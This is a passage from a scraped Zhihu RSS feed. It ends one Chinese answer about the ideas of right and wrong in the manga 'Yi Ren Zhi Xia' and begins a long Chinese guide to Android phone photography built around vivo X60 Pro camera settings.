src=\"https://pic1.zhimg.com/v2-25462c072d34525d727e1fca4ddbbd83_720w.jpg?rss\" data-rawwidth=\"674\" data-rawheight=\"227\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-25462c072d34525d727e1fca4ddbbd83\" data-watermark-src=\"v2-8bfc33dd570d661ab57a3890c0f7d036\" data-private-watermark-src=\"\"></p>\n<p>回到漫画512回，宝儿姐说：我不杀人，看来宝宝起码已经了解了死亡的基本含义，但是她依然能轻松的说出：他们的死与我无干；正如老天师说的：脚在自己身上长着，走不走，走什么路难道不是自己决定？没有一只老虎，会因为吃了羚羊而下地狱；子曰：内省不疚，夫何忧何惧？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fc68ecb787281cc00e034b89e9f7a8ec_720w.jpg?rss\" data-rawwidth=\"681\" data-rawheight=\"268\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fc68ecb787281cc00e034b89e9f7a8ec\" data-watermark-src=\"v2-62e1ae8cc9ffdd446fdfe185b4a4b983\" data-private-watermark-src=\"\"></p>\n<p><b>归根</b></p>\n<p>但我们普通人不是宝儿姐，我们有孟子所谓的羞恶，恭敬，是非，恻隐这些人之本性；普通人约束“本欲”的方式就是区分“可欲”孟子曰：“可欲之谓善”，所谓“可欲”“求则得之，舍则失之，是求有益于得也，求在我者也；求之有道，得之有命，是求无益于得也，求在外者也。”求我所求，失我所失，不取一毫，不拔一毛；这便是“可欲”；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-842788a1dac0eb3e697d2e519d4624fb_720w.jpg?rss\" data-rawwidth=\"707\" data-rawheight=\"298\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-842788a1dac0eb3e697d2e519d4624fb\" data-watermark-src=\"v2-0cf300bf9f8a1d49d26d4ea388ff9571\" data-private-watermark-src=\"\"></p>\n<p>先天阳气还有个名字叫根宗；意为最初的根本；这既是漫画536（569）话中提到的生命之光，也是人类希望回到先天一炁状态的美好愿景；用漫画中武当周掌门的话来说：不强求什么，让本欲自然剥落；致虚极，守静笃，万物并作，吾以观其复。 夫物芸芸，各复归其根。（语出《老子》）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e106dbb4e920807fcd25dfb325ad5306_720w.jpg?rss\" data-rawwidth=\"659\" data-rawheight=\"319\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e106dbb4e920807fcd25dfb325ad5306\" data-watermark-src=\"v2-0791bf46a17b40726ec4e26c6c68be91\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<p><br></p>\n<p>以上就是对漫画536（569）话中正邪概念的一些个人想法，确实比较主观；相信后续二叔还会有对这一思想的补充；回到本篇漫画，邪祟概念的确定个人认为并不是对正邪势力的一刀切，邪法也有身不由己者，正道也有不实之辈；但还是孟子说的：尧舜之道，不过是人为罢了。你穿尧的衣服，说尧的话，做尧的事，你便是尧了。你穿桀的衣服，说桀的话，做桀的事，你便是桀了；</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1264966216768692224\" data-image=\"https://pic2.zhimg.com/v2-28243c09e18dc58c62df761ed87850a5_l.jpg\" data-image-width=\"167\" data-image-height=\"167\" class=\"internal\">一人之下•门派录</a><p><img src=\"https://pic1.zhimg.com/v2-5c10e13da4092b73d90f0456e1b82aee_720w.jpg?rss\" data-rawwidth=\"467\" data-rawheight=\"254\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>整理不易，跪求点赞</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/474119152/answer/2015179823?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">24 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475953565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》漫画 537（570） 话？</a><br><a href=\"http://www.zhihu.com/question/468513706?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果穿越成漫画《一人之下》的配角，你会做什么？</a><br>\n","link":"http://www.zhihu.com/question/474119152/answer/2015179823?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"安卓相机完全操作指南","date":"2021-07-20 14:15:08","description":"\n<h2>写在前面</h2>\n<p>现在是北京时间的 2021 年 6 月 18 日晚上 11 点 24 分，我正坐在新疆夏塔的温泉酒店里。今天的拍摄很不顺利，天空阴气沉沉，而且时不时落着小雨。而我刚刚得到消息，明早的日出拍摄也落空了，因为几乎不会有日出的可能。</p>\n<p>所以，现在我突然有了一块很完整的时间，我想这是一个很好的机会，让我整理一下心情，开始这一篇长篇文章的写作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9d8a1918cb0bfa6ab48ca1fa05b7ae75_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic2.zhimg.com/v2-9d8a1918cb0bfa6ab48ca1fa05b7ae75_r.jpg\"></figure><p>如你所见，这篇文章的名字叫做《安卓相机操作指南》。这也就意味着还有一篇《iPhone 相机操作指南》，而我相信其实很多人之所以能够了解我就是因为那篇文章。最近的《iPhone 相机操作指南 3.0》目前在各个社交网络平台总的阅读量已经超过了 1000 万。一想到每 140 个人中，就有一个人阅读过我的文章，心里还是有一点骄傲。</p>\n<p>但正是这篇文章的火爆，越来越多的读者通过各种方式询问，什么时候可以有一个《安卓相机操作指南》。一开始我都会用「本质上都是相通，安卓用户阅读一样有收获」来回答，但其实归根到底是因为「心虚」。因为在当时，我并没有长时间大批量使用安卓手机的经历，我很清楚，我还没有能力完成这样的写作。并且当时 iPhone 相机在手机摄影领域也是一枝独秀，我也认为安卓手机还「不值得认真」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-928a94c8888951eecbb33f0d5c04dc8e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-928a94c8888951eecbb33f0d5c04dc8e_r.jpg\"></figure><p>但是时间过得很快，这两年里我自己发生了很多变化，由于工作的原因，我开始接触大量的安卓旗舰影像手机，甚至是在过去的两年里，为不同的安卓机型进行过深度测试，或者是完成样片拍摄。而与此同时，这两年里国产安卓的影像能力突飞猛进，甚至还演绎出了自己的不同特色。</p>\n<p>所以，我想现在是一个很好的时机，完成这一篇《安卓相机操作指南》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9b5f2e2071d669d5cd36e96142db27fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic3.zhimg.com/v2-9b5f2e2071d669d5cd36e96142db27fe_r.jpg\"></figure><p>但是想要完这样一篇文章，不仅仅是对我有难度，我相信对于在座的各位也有难度，因为不出意外，这篇文章的字数将会达到 30000 字以上，堪比一篇论文。不过事实已经证明，只要你拿出诚意写作，就会获得诚意的回响。我在写《iPhone相机操作指南 1.0》的时候某个平台的完整阅读率不足 5%，但是等到《iPhone 相机操作指南 3.0》，文章的完整阅读率竟然达到了 20%。</p>\n<p>说到这里，是想告诉你不要因为这篇文章看起来很长就下意识放弃，相信我，我会尽量用最直白、简单、有趣而又真诚的文字帮你做好手机摄影这件事。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-44d802a24b0c5a897c46bcd8b8b967f8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-44d802a24b0c5a897c46bcd8b8b967f8_r.jpg\"></figure><p>另一件我想要和你分享的学习心得是，「请尝试先一口气读完。」</p>\n<p>我一直很反对「摄影教程的碎片化」。其实不仅仅是摄影教程，我认为任何一门技艺的学习都离不开「系统」。我在《iPhone 相机操作指南》中不断重申的一点：</p>\n<p><b>今天很多人看似在学习知识，其实很多时候不过是获取信息。</b></p>\n<p>今天的社交网络好像到处都是摄影教程，但是所有的这些教程都是零零散散，而这些不系统的知识，唯一的帮助就是满足你的获得感。对你的实际帮助不仅微乎其微，甚至是会产生一定程度的误导，就是典型的「知其然不知其所以然」。因此我一直建议，如果你真的想要学会拍好照片，找到一本好书，系统地学习，绝对才是真正的收获颇丰。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-293b296066f5878181d7622c61f517f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-293b296066f5878181d7622c61f517f3_r.jpg\"></figure><p>这听起来我好像在自吹自擂（其实也有点），但的确这篇文章和其它教程最大的不同就是在于「它非常系统」。我甚至是完全按照一本书的骨架进行丰满（事实上，《iPhone 相机操作指南》的实体书真的很快就上市了）。</p>\n<p>不信你看，你现在看的前言就是一本书的标准构成。</p>\n<p>我知道，我知道。</p>\n<p>今天的各位对于阅读文字肯定是希望越短越好，所以这篇文章的文字我将会尽最大可能的凝练。换句话说，如果你真的想学好手机拍照，或者是大一点说想要学好摄影，那这不仅仅是我目前所学，也是你必须要了解的最少基本。</p>\n<p>既然是安卓手机摄影指南，所以我还想和大家分享一些我对于安卓手机摄影的理解。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f6ccc56bcf3317c2d70156c356e3d8ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-f6ccc56bcf3317c2d70156c356e3d8ad_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>很多人说，今天的手机功能似乎到了一个瓶颈，因为今天几乎所有的品牌在发布会上笔墨最多的就是拍照能力。相信通过前面问题的一个探讨，你应该已经意识到，并不是手机厂商选择「影像能力」，而是我们今天的生活已经完完全全：</p>\n<p>「离不开影像。」</p>\n<p>我很喜欢《旅行的意义》中的一句话：</p>\n<blockquote>人生的许多光景，好像只有被影像记录下来，才会减少时间飞逝的焦虑。</blockquote>\n<p>所以某种意义上，手机的影像能力并不是手机的附属，而是手机的重要组成部分，我甚至更愿意叫它「手持的相机」。</p>\n<p>而这个手持的相机也有着自己独特的发展轨迹，这种轨迹在今天也演绎出了两个非常重要的派别，也就是「iPhone 手机摄影」和「安卓手机摄影」。iPhone 手机摄影的风格我在《iPhone 相机操作指南》中已经详尽表述，在这里我就不再赘述。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b0797bed5fdacf0fbfa1a3ebc0699ace_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-b0797bed5fdacf0fbfa1a3ebc0699ace_r.jpg\"></figure><p>所以我们就来说说安卓手机摄影风格。</p>\n<p>可困难的是，我们知道安卓手机的品牌和型号众多。其实长久以来，这也是安卓手机摄影的问题所在。因为摄影需要长时间的沉淀，但是安卓品牌因为差异竞争的追求，导致几乎每个品牌都是各说各话，缺少传承。不过正如前面所说，这几年以来，国产安卓旗舰产品力越发凸显，他们也在尝试弥补个中不足。</p>\n<p>这也让我遇到了写作过程中的第一个大困难（当然也是某种意义上的幸福烦恼）：</p>\n<p>「我到底该选择哪一台手机作为基准。」</p>\n<p>目前国产手机是群雄割据，每一款手机都尝试在影像上有所突破。而且几乎每一款手机我们都或多或少的使用过一段时间，拿出任何一款倒是都能说个一二。这其实也是我迟迟未能下笔的另一个原因。</p>\n<p>不过在纠结了一段时间以后，我决定反向思考。我不再从某个手机品牌的角度出发，而是从自己现有的拍摄作品出发，统计出自己使用频率最高的一款。</p>\n<p>此时我发现，在过去的几年里，我拍摄作品最高的机型竟然完全出自一个系列，而且这个结果同时也印证在了我的好朋友摄影师 Jamie 身上（Jamie 也是本文大量样张的作者）。</p>\n<p>这就是，vivo  X50 &amp; vivo X60 系列。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-dee83977b96146d108bc2a2212870b32_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-dee83977b96146d108bc2a2212870b32_r.jpg\"></figure><p>我们共计使用二者拍摄超过了近万张照片，远超出其它安卓影像旗舰。所以选择哪一款机型的问题，便迎刃而解。一方面大量的拍摄样片是整个教程丰富度的基础，而另一方面这也说明了 vivo X 系列的「全面」。这种全面首先是硬件上多个焦距综合实力最佳，并有独特影像技术加持。然后由技术传导到拍摄题材，无论你是风光还是人像，日常记录还是作品创作，拍远拍近，拍大拍小都完全胜任。</p>\n<p>此时我们再回看，vivo 的顶级安卓影像旗舰的确可圈可点，尤其是 vivo X50 Pro 到今天的 vivo X60 Pro 系列，可以绝对代表国产影像实力，所以我也从心底里愿意为这样的优秀产品打 call ，就像是我当时对 iPhone 拍照的热爱一样。</p>\n<p><b>所以，本文所有图片均使用 vivo X50 Pro 以及 vivo X60 Pro 拍摄。</b></p>\n<p>言归正传，vivo X60 Pro 系列为代表的国产安卓影像旗舰的特点为：</p>\n<p><b>1. 高规格的硬件基础</b></p>\n<p>这里更高规格的硬件基础，请不要简单地误解为高像素。我这里真的需要重申一次，高像素对于摄影，尤其是手机摄影并不是重要因素，甚至不能说是主要因素。像素影响的无非就是分辨率，但是今天手机的相机像素已经远超用户的实际使用能力。</p>\n<p>所以这里所说的高规格更多的指传感器尺寸面积的增加，以及镜头物理组的技术突破。前者让今天的手机有了更好的弱光画质，而后者让长焦镜头在手机上终于大放异彩。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8bd1850770396180122ca78eacf3e036_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-8bd1850770396180122ca78eacf3e036_r.jpg\"></figure><p><b>2. 具有明确风格的颜色调教</b></p>\n<p>以前一提到安卓手机可能会说颜色太艳丽，但是实际上这几年主流安卓手机的调色风格不仅越发克制，甚至是还开始演绎出自己的风格。</p>\n<p>比如 vivo 的高端影像机的调色风格就非常的油画且浓郁。我甚至在社交网络上把 vivo 的照片和徕卡相机的直出图片进行对比，竟然大多数人无法分清二者的区别。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d5a8a25f92280d4e4c4bc056352e51f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-d5a8a25f92280d4e4c4bc056352e51f3_r.jpg\"></figure><p><b>3. 更加多样化的内置相机</b></p>\n<p>由于安卓本身应用生态的原因，导致缺少很多 iPhone 上流行的好玩应用。但是好在，安卓手机在内置相机的功能设置上更为大胆。比如自定义专业拍照模式已经存在多年，现在这个专业模式甚至延伸到了视频领域。另一方面包括一些个性化功能，比如虚化焦外调整，也直接内置。某种意义上，也提高了拍摄效率。</p>\n<p>而以上三点，也是这篇文章围绕的核心，在我看来，它也是我使用安卓手机摄影的几个最重要的乐趣。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c65fdde73a63a9987bc0353856872912_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-c65fdde73a63a9987bc0353856872912_r.jpg\"></figure><p>好了，废话就到这里了（虽然我认为这些废话很有用），让我们正式开始这场手机摄影之旅吧。</p>\n<p>当然按照我的写作习惯，我在前面放上一张全文的思维导图，它是我们这趟旅行的重要指南针，希望你可以先从全局上对于拍照这件事有一个把握。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-01c25af8b02ce78032184ac6be618cec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2506\" data-rawheight=\"2648\" class=\"origin_image zh-lightbox-thumb\" width=\"2506\" data-original=\"https://pic1.zhimg.com/v2-01c25af8b02ce78032184ac6be618cec_r.jpg\"></figure><h2>01. 避不开的审美</h2>\n<p>在所谓的干货之前，我可能需要告诉你一个残酷的事实。即最终决定你照片好坏的可能并不是技术，而是审美。从我的亲身经历来看，如果一个人有着非常好的审美，或者有非常系统的美学教育，那么拍照水平一定不会差。</p>\n<p>甚至是，我身边的很多知名摄影师，他们对于相机原理一知半解，但是因为有过长时间的音乐、美术、舞蹈的学习，都能拍摄出非常惊叹的照片。其实我自己是非常羡慕的。因为我自己来自于教育相对落后的区域。最大的痛点就是美术课和音乐课基本上都是摆设。最直接的影响是，我已经大学毕业了，却对于色彩知识完全不知。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3ae16b1167ad0e74b83080dac81b9238_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-3ae16b1167ad0e74b83080dac81b9238_r.jpg\"></figure><p>但今天我早就发现，所谓的后期调色，就是摄影师本身对于颜色的理解。而一些更高级的摄影后期，本质上都是在照片的基础上「进行绘画」。</p>\n<p>不过，好在审美并不仅仅局限于艺术领域。归根到底，艺术就是一种「表达」。而只要你有着足够丰沛的表达能力，照片只不过是一种表达的媒介而已。安塞尔·亚当斯说：</p>\n<blockquote>我们不是在用相机在拍照，我们带到摄影中去的是你曾经读过的书，看过的电影，听过的音乐，走过的路，爱过的人。</blockquote>\n<p>归根到底，你的经历也是你的审美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f5c1546b0beafb49143b01a4ec8e5785_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-f5c1546b0beafb49143b01a4ec8e5785_r.jpg\"></figure><p>所以即使你和我一样，没有经历过美学教育，也没有关系，我们可以把我们的经历揉入到摄影中。而提升审美能力从现在开始也不晚，其实完全可以通过大量的练习获得。最为直接的就是「大量阅片」。当你看过一百位摄影师的作品时，你自然就会知道到底什么是美。</p>\n<p>这种阅片有很多种，你可以通过社交网络关注摄影师。但我更期待的是你可以去看画册，尤其是各种摄影大师的画册。本文中会多次提到亚当斯的名字，而如果你找到亚当斯的画册，看上几本，你将会重新认识风光摄影，就是这么有效。如果你运气很好，生活在大城市，观展也是最好的方式。并且不仅仅是摄影艺术展，任何有趣的展览都会对你的摄影大有裨益。</p>\n<p>你可能注意到了，本文中的配图数量惊人，基本上每几百字就会有一张配图。这是因为我们希望这篇文章不仅能在技术上对你有所帮助，而是在审美上也希望给予一些指引。所以每一张照片都是我们花心思精心挑选。除了读文字，多花点时间仔细看看每一张图，完成这一百张的阅片，也应该有着很不一样的收获。</p>\n<p>这是我能在审美上，唯一能帮助大家的地方。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6ef741b7636e871995a5342e213f5ad2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-6ef741b7636e871995a5342e213f5ad2_r.jpg\"></figure><p>审美这个章节，是本文中所有的章节中最短的一个，但它可能是最重要的一个。我并不是说，技术不重要。但我很欣赏李涛老师的一句话：</p>\n<blockquote>技术决定下限，审美决定上限。</blockquote>\n<p>接下来文中所述技术，我相信读了几遍，自然会懂。而此段所描述审美，可能就要一生践行了，与君共勉。</p>\n<h2>02. 相机基本设置</h2>\n<p>手机相机的拍摄界面我相信很多人几乎天天都会看到，但其中大多数功能可能即使最后手机已经不能再使用，你也从来没有使用甚至是了解过。可正如前面所说，安卓手机一个非常重要的特点就在于内置相机本身极高的功能丰富度。所以其实相机本身有许多功能都是非常重要的创作工具，但却可能被你完全忽视了。</p>\n<p>所以在这一章节中，我们要做的就是了解相机中各项功能的含义，并对它们进行基本设置的选择。需要再次强调的是，在这一部分我将会使用 vivo X60 Pro+ 这款手机的界面进行演示。如果你不是这个型号的安卓手机也不需要担心，绝大多数功能对于其它手机一样具有参考作用。最多的不同之可能是排列的顺序不同而已。所以你大可放心阅读，然后针对性的在自己的手机上尝试。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-573a232ceacfb151e6d2a8d423fa7429_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-573a232ceacfb151e6d2a8d423fa7429_r.jpg\"></figure><p>当我们打开 vivo X60 Pro+ 的相机界面以后，我们其实可以把整个相机的拍摄区域从屏幕下方到上方分为几个部分。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-04abfcb5f87603e042c026ee35b62b05_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1217\" data-rawheight=\"1091\" class=\"origin_image zh-lightbox-thumb\" width=\"1217\" data-original=\"https://pic2.zhimg.com/v2-04abfcb5f87603e042c026ee35b62b05_r.jpg\"></figure><h3>拍摄模式区</h3>\n<p>在这一部分我们可以针对性地选择不同拍摄形式，比如最常见的就是「照片」，其次是「录像」，也就是视频功能。</p>\n<p>而拍摄模式也是我们每一次拍摄最先做的一个决定。当你看到一个场景时，我们潜意识最先要进行的一个判断就是我是想要拍一张照片还是拍一段视频。</p>\n<p>当然也可以是更为细致的类型，比如我是想要拍摄大光圈的人像效果选择人像模式，还是要拍摄弱光下的夜景效果选择夜景模式。总之，这都是我们在打开相机之前就要做好的选择。</p>\n<p>并且选择一个拍摄模式以后，相机界面的各项设置都会针对性跟随更改。考虑到各拍摄模式需要整体知识学习后才能讲解，所以下面其它区域的讲解部分只先从「拍照」模式开始。</p>\n<h3>镜头选择区</h3>\n<p>随着手机摄影的发展，多镜头几乎已经成为每一个主打摄影手机的标配。所以这一个区域就是可以让我们用来选择不同焦距的镜头。可不要小看这一部分，不同镜头有着完全不同的拍摄效果，对于画面有着决定性的作用。所以我们后面甚至会有一个针对性的章节来叙述，这里我们先按下不表，你只要知道这里可以进行不同的镜头切换即可。</p>\n<p>在镜头区域切换一侧的是针对性的效果设置，根据拍摄模式不同也略有差异。不过总得来说，主要包含美颜效果、色彩滤镜、镜头虚化能力等等。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-bc93e6e9bea3699c5b9de13925e0b044_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic1.zhimg.com/v2-bc93e6e9bea3699c5b9de13925e0b044_r.jpg\"></figure><p>所谓的滤镜，代表的是画面中的色彩。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f3fa86a81b69aa097a92c01612919ccd_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-f3fa86a81b69aa097a92c01612919ccd_r.jpg\"><figcaption>使用「肖全滤镜」拍摄</figcaption></figure><p>对于今天的手机用户来说，色彩滤镜可以说是再熟悉不过了。这几乎成为手机最为主流的后期方式。但是现在你也可以把这种后期方式进行前置。先选好自己喜欢的滤镜，再进行拍摄。当然我知道，你可能会说，后期配不是更加自由。但是如果前期可以配滤镜，有两个好处：</p>\n<ol>\n<li>选择择对应的滤镜以后，手机的取景画面也会针对性的改为对应的滤镜颜色，这会极大的提高你的拍摄欲望。你会发现很多平平无奇的场景，可能就是因为滤镜的出现好看起来，让你捕捉到更多意想不到的画面。</li>\n<li>安卓手机的滤镜系统有些不能后期追加。比如在 vivo X60 Pro+ 中，有两个我非常喜欢的滤镜，一个是肖全的黑白滤镜，一个刘雯的彩色滤镜。这两个滤镜都有着非常迷人的影调和色彩风格，但是只有在前期拍摄以后才能选择，不能在现有的照片上添加。我猜测，可能是类似这样的滤镜，为了更好的拍摄效果，镜头的研发工程师们不是在画面上套滤镜，而是在画面中数字转为图像的过程中直接控制色彩风格。这样的好处就是，结果更加真实自然，色彩更加扎实，不虚假。</li>\n</ol>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3bf8a712db6c6a36cdf3ec32b153d204_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-3bf8a712db6c6a36cdf3ec32b153d204_r.jpg\"><figcaption>使用「法式印象」拍摄</figcaption></figure><p>尤其是，大家可以试着打开自己手机里有趣的黑白滤镜，比如 vivo X60 Pro+ 的黑白滤镜进行取景试试，您会发现一个截然不同的黑白世界。</p>\n<p>所谓的光效，是代表画面中的光影之感。</p>\n<p>这一调整主要是针对人像摄影中，人物面部的光影效果。在以前人像中的肖像摄影，摄影师需要使用闪光灯布置拍摄，来营造人物面部的不同光影效果。但是现在手机的算力越来越好，手机开始模拟类似的光影效果。比如 vivo X60 Pro+ 中就包含了不同的拍摄人像光线效果：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-86093375d4d6eb43e83f76665e318e28_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-86093375d4d6eb43e83f76665e318e28_r.jpg\"></figure><h3>取景框</h3>\n<p>用于画面的实时预览。虽然这里没有任何功能设置，但还是要说一句题外话。安卓手机和 iPhone 一个明显的不同就是取景是否可以所见即所得。iPhone 几乎没有任何差异，过去几年里安卓则差异巨大，尤其是很多手机品牌为了优化，甚至会出现截然不同的结果。</p>\n<p>如果你真的很喜欢手机摄影，那我建议你远离类似的手机。其实这也是我自己很喜欢 vivo X60 Pro+ 的一个原因，它的取景画面和拍摄画面基本上没有太多差异。这对我拍摄构思起到了重要帮助。</p>\n<h3>功能设置区</h3>\n<p>这片区域主要针对每个拍摄模式的针对性设置，它会跟随拍摄模式而变化。</p>\n<p><b>闪光灯</b></p>\n<p>其实我一直认为闪光灯是很多人忽视的「宝藏功能」。</p>\n<p>首先，闪光灯的基本功能是<b>为了画面中光线不足时，主动进行补充。</b></p>\n<p>比如下面画面中的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-78eb3a13806f64ba39b2ec913cfa7202_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-78eb3a13806f64ba39b2ec913cfa7202_r.jpg\"><figcaption>关闭闪光灯拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0ec4599637b99dc6a7a2f30ecc9551cf_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-0ec4599637b99dc6a7a2f30ecc9551cf_r.jpg\"><figcaption>开启闪光灯拍摄</figcaption></figure><p>但随着后来闪光灯在小型相机上的普及，逐渐演绎出了一种非常独特的摄影风格。尤其是日系写真摄影师们，经常会在人像或者是生活拍摄中使用闪光灯直接拍摄。无论是我们熟知的森山大道还是荒木经惟都有着类似的拍摄使用。</p>\n<p>所以如果你对于自己的拍摄陷入了一种瓶颈，我特别建议你可以试试开启闪光进行拍摄。而且需要注意的是，并不是一定是暗光的夜晚才能使用闪光，也不是只有人像才能使用闪光，而是只要是你想要给自己的作品中增添一种「光感」，都可以进行尝试。</p>\n<p>比如下面的照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1b16d9c0a4c570fb483719ba563349a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image 